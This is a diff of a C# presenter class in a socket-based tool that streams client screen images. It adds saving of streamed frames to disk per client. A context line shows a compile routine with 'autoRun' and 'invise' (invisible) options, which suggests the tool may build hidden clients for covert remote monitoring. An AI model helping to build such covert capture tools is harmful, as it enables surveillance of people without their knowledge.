@@ -22,11 +22,14 @@ namespace networkWork.presenter
 
             vS.connectionClientEvent += mW.connectionClient;
             vS.shutdownClientEvent += mW.shutdownClient;
+            vS.shutdownClientEvent += VS_shutdownClientEvent;
             mW.streamStart += startStreem;
             mW.sendInfo += taskStream.sendTask;
             mW.ipEvent += MW_ipEvent;
             mW.compile += MW_compile;
             mW.chooseNetwork += MW_chooseNetwork;
+            mW.StartSaveFraim += MW_StartSaveFraim;
+            mW.StopSaveFraim += MW_StopSaveFraim;
             GO.networkCongestionMonitoring += mW.showNetworkLoad;
             taskStream.message += mW.message;
 
@@ -78,9 +81,38 @@ namespace networkWork.presenter
         private void startStreem(Socket client, streamWindow sW)
         {
             sW.client = client;
-            sW.streamId = vS.startStreaming(client, sW.draw);
+            vS.AddActionForSocket(client, sW.draw);
             sW.buttonTask += vS.sendTask;
-            sW.closeWindow += vS.stopStreaming;
+            sW.closeWindow += vS.RemoveActionForSocket;
+        }
+
+        private Dictionary<Socket, ImgSaver> boffer = new Dictionary<Socket, ImgSaver>();
+        private void MW_StartSaveFraim(Socket client, string path)
+        {
+            string[] h = path.Split(new char[] { '\\' });
+            if (h[h.Length - 1].Split(new char[] { '.' })[0] == "")
+            {
+                mW.message($"Not a valid path :(", "Error!");
+                return;
+            }
+
+            ImgSaver saver = new ImgSaver(path.Replace(h[h.Length - 1], ""), h[h.Length - 1]);
+            vS.AddActionForSocket(client, saver.SaveImg);
+            boffer.Add(client, saver);
+        }
+
+        private void MW_StopSaveFraim(Socket client)
+        {
+            if (!boffer.ContainsKey(client))
+                return;
+            vS.RemoveActionForSocket(client, boffer[client].SaveImg);
+            boffer.Remove(client);
+        }
+
+
+        private void VS_shutdownClientEvent(Socket client, string arg2, DateTime arg3)
+        {
+            MW_StopSaveFraim(client);
         }
 
         private void MW_compile(compileMode mode, string server, bool autoRun, bool invise, string path)
